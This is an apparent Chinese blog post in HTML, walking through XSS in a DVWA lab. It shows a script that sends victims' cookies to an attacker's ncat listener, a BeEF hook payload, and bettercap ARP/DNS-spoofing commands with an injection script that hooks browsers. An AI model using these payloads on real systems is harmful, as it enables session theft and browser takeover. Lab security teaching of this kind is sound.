@@ -1,0 +1,383 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>我没有失眠啊i</title>
+<meta name="description" content="" />
+<link rel="shortcut icon" href="https://gaixu-github.github.io//favicon.ico?v=1592781376751">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://gaixu-github.github.io//styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://gaixu-github.github.io/">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://gaixu-github.github.io//images/avatar.png?v=1592781376751" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">我没有失眠啊i</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#%E4%B8%80-xss%E6%94%BB%E5%87%BB%E7%9A%84%E7%B1%BB%E5%9E%8B">一、XSS攻击的类型</a></li>
+<li><a href="#%E4%BA%8C-%E5%85%B7%E4%BD%93%E5%88%86%E6%9E%90">二、具体分析</a>
+<ul>
+<li><a href="#1%E5%B0%86dvwa%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E8%B0%83%E5%88%B0%E4%BD%8E">1.将DVWA的安全性调到低</a></li>
+<li><a href="#2%E5%AD%98%E5%82%A8%E5%9E%8Bxss">2.存储型XSS</a></li>
+<li><a href="#3xss-dom%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%8F%91%E9%80%81cookie">3.XSS DOM型漏洞—发送Cookie</a>
+<ul>
+<li><a href="#akali%E5%90%AF%E7%94%A8ncat%E7%9B%91%E5%90%AC81%E7%AB%AF%E5%8F%A3">a.kali启用ncat监听81端口</a></li>
+<li><a href="#b%E6%8F%92%E5%85%A5js%E4%BB%A3%E7%A0%81-%E5%AE%9A%E4%B9%89%E5%9B%BE%E7%89%87%E8%BF%94%E5%9B%9Ecookie">b.插入JS代码。定义图片，返回cookie</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E4%B8%89-web%E6%A1%86%E6%9E%B6%E6%94%BB%E5%87%BB%E5%B9%B3%E5%8F%B0beff">三、Web框架攻击平台BeFF</a>
+<ul>
+<li><a href="#1%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D">1.基本介绍</a>
+<ul>
+<li><a href="#a%E7%AE%80%E4%BB%8B">a.简介</a></li>
+<li><a href="#b%E7%89%B9%E7%82%B9">b.特点</a></li>
+<li><a href="#c%E5%B8%B8%E7%94%A8%E5%8A%9F%E8%83%BD">c.常用功能</a></li>
+</ul>
+</li>
+<li><a href="#2beef%E7%9A%84%E4%BD%BF%E7%94%A8">2.beef的使用</a>
+<ul>
+<li><a href="#a%E5%90%AF%E5%8A%A8beef">a.启动beef</a></li>
+<li><a href="#b%E5%BF%AB%E9%80%9F%E6%BC%94%E7%A4%BA">b.快速演示</a></li>
+<li><a href="#c%E6%A8%A1%E5%9D%97%E8%AF%B4%E6%98%8E">c.模块说明</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E5%9B%9B-bettercap-beff%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB">四、Bettercap + BeFF中间人攻击</a>
+<ul>
+<li><a href="#1bettercap%E8%BF%9B%E8%A1%8Cdns%E6%AC%BA%E9%AA%97">1.bettercap进行dns欺骗</a></li>
+<li><a href="#2bettercap%E9%85%8D%E5%90%88beef">2.bettercap配合beef</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BA%94-%E7%BB%8F%E9%AA%8C">五、经验</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="/" class="menu" style="animation-delay: 0s">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.2s">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu" style="animation-delay: 0.4s">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu" style="animation-delay: 0.6000000000000001s">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a></div>
+    <a class="rss" href="https://gaixu-github.github.io//atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">XSS漏洞</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2020-06-22 / 5 min read
+        </div>
+        
+          <img class="post-feature-image rounded-lg mx-auto my-4" src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1592791207007&amp;di=50ffd05935df354873dbff77fe1403b5&amp;imgtype=0&amp;src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_match%2F0%2F11760064229%2F0.jpg" alt="">
+        
+        <div class="post-content yue">
+          <h4 id="一-xss攻击的类型">一、XSS攻击的类型</h4>
+<p>​	1.存储型（持久性跨站脚本）：跨站代码存储在服务器（数据库）特点是：长期存储在服务器端，每次用户访问都会被执行js代码</p>
+<p>​	2.反射型（非持久性跨站脚本）：用户访问服务器—跨站链接—返回跨站源码，通过社工方式将带有js脚本的链接发给受害者</p>
+<p>​	3.DOM型：文档对象模型，本质上也是反射型</p>
+<h4 id="二-具体分析">二、具体分析</h4>
+<h5 id="1将dvwa的安全性调到低">1.将DVWA的安全性调到低</h5>
+<img src="http://image.scorner.cn/qiniulmg/20200621173958.png" alt="image-20200621173943309" style="zoom:100%;float:left" />
+<h5 id="2存储型xss">2.存储型XSS</h5>
+<p>输入js代码，到存储型测试中，出现弹窗说明该网站存在xss漏洞,可以被注入js脚本，且脚本已经被注入到网站中，每次刷新都会执行js代码</p>
+<img src="http://image.scorner.cn/qiniulmg/20200621174056.png" alt="image-20200621174054726" style="zoom: 100%; float: left;" />
+<img src="http://image.scorner.cn/qiniulmg/20200621174202.png" alt="image-20200621174150273" style="zoom:100%;" />
+<h5 id="3xss-dom型漏洞发送cookie">3.XSS DOM型漏洞—发送Cookie</h5>
+<h6 id="akali启用ncat监听81端口">a.kali启用ncat监听81端口</h6>
+<img src="http://image.scorner.cn/qiniulmg/20200621180110.png" alt="image-20200621180107514" style="zoom:100%;" />
+<h6 id="b插入js代码-定义图片返回cookie">b.插入JS代码。定义图片，返回cookie</h6>
+<pre><code class="language-js">&lt;script&gt; var img = document.createElement('img');
+img.src = 'http://192.168.0.105：81/log？' + escape(document.cookie); &lt;/script&gt;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="http://image.scorner.cn/qiniulmg/20200621185021.gif" alt="测试3" loading="lazy"></figure>
+<p>这样我们便返回了当前页面的cookie，且每次加载页面都会返回一次cookie，获得了cookie等于获取了账号的使用权</p>
+<h4 id="三-web框架攻击平台beff">三、Web框架攻击平台BeFF</h4>
+<h5 id="1基本介绍">1.基本介绍</h5>
+<h6 id="a简介">a.简介</h6>
+<p>​	是目前欧美最流行的web框架攻击平台</p>
+<h6 id="b特点">b.特点</h6>
+<ul>
+<li>一款针对游览器的渗透测试工具</li>
+<li>实现对XSS漏洞的攻击和利用</li>
+<li>Ruby语言编写</li>
+<li>目标主机每隔一段时间会向BeFF服务器发送一个请求，询问是否有新的代码需要执行</li>
+</ul>
+<h6 id="c常用功能">c.常用功能</h6>
+<ul>
+<li>键盘记录记录器</li>
+<li>网络扫描</li>
+<li>游览器信息收集</li>
+<li>绑定shell</li>
+<li>与MSF集成等</li>
+</ul>
+<h5 id="2beef的使用">2.beef的使用</h5>
+<h6 id="a启动beef">a.启动beef</h6>
+<img src="http://image.scorner.cn/qiniulmg/20200622071053.png" alt="image-20200621190615820" style="zoom:100%;" />
+<p>其中payload为</p>
+<pre><code class="language-js">&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>其中beef后台网址为</p>
+<pre><code class="language-html">http://127.0.0.1:3000/ui/panal
+</code></pre>
+<h6 id="b快速演示">b.快速演示</h6>
+<p>受害者进入beef的钩子页面或者将payload注入带有XSS漏洞的网页中,beef后台立刻挂钩</p>
+<pre><code class="language-html">http://192.168.0.105:3000/demos/basic.html
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="http://image.scorner.cn/qiniulmg/20200621192126.png" alt="image-20200621192124458" loading="lazy"></figure>
+<h6 id="c模块说明">c.模块说明</h6>
+<p>Detail:游览器，插件版本</p>
+<figure data-type="image" tabindex="3"><img src="http://image.scorner.cn/qiniulmg/20200621193609.png" alt="image-20200621193607900" loading="lazy"></figure>
+<p>logs 记录键盘和鼠标操作 ，如被害者在网页输入hello word 攻击者便获取了键盘的输入记录 和点击</p>
+<img src="http://image.scorner.cn/qiniulmg/20200621192342.png" alt="image-20200621192340767" style="zoom:80%;" />
+<p>​	Commands：</p>
+<p>​		绿色：适合目标游览器，执行结果用户不可见</p>
+<p>​		红色：不适合</p>
+<p>​		橙色：适合，但结果对用户可见</p>
+<p>​		灰色：未测试</p>
+<figure data-type="image" tabindex="4"><img src="http://image.scorner.cn/qiniulmg/20200621193128.png" alt="image-20200621193126903" loading="lazy"></figure>
+<p>可以获取用户的cookie，打开用户的摄像头等，定位用户的位置等等，伪造flash更新等，功能之多，难以想象</p>
+<figure data-type="image" tabindex="5"><img src="http://image.scorner.cn/qiniulmg/20200621194722.png" alt="image-20200621194721372" loading="lazy"></figure>
+<h4 id="四-bettercap-beff中间人攻击">四、Bettercap + BeFF中间人攻击</h4>
+<h5 id="1bettercap进行dns欺骗">1.bettercap进行dns欺骗</h5>
+<p><mark>注意dns服务器需设置成网关</mark></p>
+<pre><code class="language-js">set arp.spoof.targets 192.168.0.104 # 受害人ip
+arp.spoof on
+
+set dns.spoof.domains www.sina.com  #设置要欺骗的域名
+set dns.spoof.address 192.168.0.105 # 将域名转换成攻击者ip
+dns.spoof on
+</code></pre>
+<p>这样当受害者访问的时候，便被劫持到了攻击者的ip</p>
+<figure data-type="image" tabindex="6"><img src="http://image.scorner.cn/qiniulmg/20200622065505.png" alt="image-20200622060429209" loading="lazy"></figure>
+<h5 id="2bettercap配合beef">2.bettercap配合beef</h5>
+<pre><code class="language-js">set dns.spoof.domains m.baidu.com # 设置欺骗的域名
+set dns.spoof.address 192.168.0.105  # 设置攻击者ip
+dns.spoof on
+
+set arp.spoof.targets 192.168.0.104 # 受害者ip
+set http.proxy.script /root/eval.js # 恶意js代码
+set http.proxy.sslstrip true  
+http.proxy on
+arp.spoof on
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="http://image.scorner.cn/qiniulmg/20200621222614.png" alt="image-20200621222612769" loading="lazy"></figure>
+<p>eval.js文件配置</p>
+<pre><code class="language-js">function onLoad(){
+	log(&quot;BeefInject loaded.&quot;);
+	log(&quot;targets: &quot; + env['arp.spoof.targets']);
+}
+
+function onResponse(req,res){
+    if(res.ContentType.indexOf('text/html')==0){
+        var body=res.ReadBody();
+        if(body.indexOf('&lt;/head&gt;')!=-1){
+            res.Body=body.replace(
+                '&lt;/head&gt;',
+               '&lt;script type=&quot;text/javascript&quot; src=&quot;http://192.168.0.105:3000/hook.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;'
+            );
+            }
+        }
+}
+</code></pre>
+<p>当受害者电脑访问m.baidu时候，跟往常一样，但是检查网页源码的时候却发现，百度已经被注入js文件了</p>
+<img src="http://image.scorner.cn/qiniulmg/20200622065832.png" alt="QQ图片20200622065747" style="zoom: 67%;" />
+<img src="http://image.scorner.cn/qiniulmg/20200622065947.png" alt="QQ图片20200622065759" style="zoom: 67%;" />
+<p>在后台，bettercap工作日志</p>
+<figure data-type="image" tabindex="8"><img src="http://image.scorner.cn/qiniulmg/20200622070038.png" alt="QQ图片20200622065753" loading="lazy"></figure>
+<p>此游览器已经被控制</p>
+<figure data-type="image" tabindex="9"><img src="http://image.scorner.cn/qiniulmg/20200622070210.png" alt="QQ图片20200622065805" loading="lazy"></figure>
+<h4 id="五-经验">五、经验</h4>
+<p><mark>少看那些不安全的网站，屏幕另一边的他不一定正在对你做什么勾当</mark>🙏</p>
+
+        </div>
+
+        
+
+
+        <div class="flex justify-between py-8">
+          
+
+          
+            <div class="next-post">
+              <a href="https://gaixu-github.github.io/post/yu-ke-tang-shi-ti-zheng-li/">
+                <h3 class="post-title">
+                  雨课堂试题
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="https://gaixu-github.github.io//media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
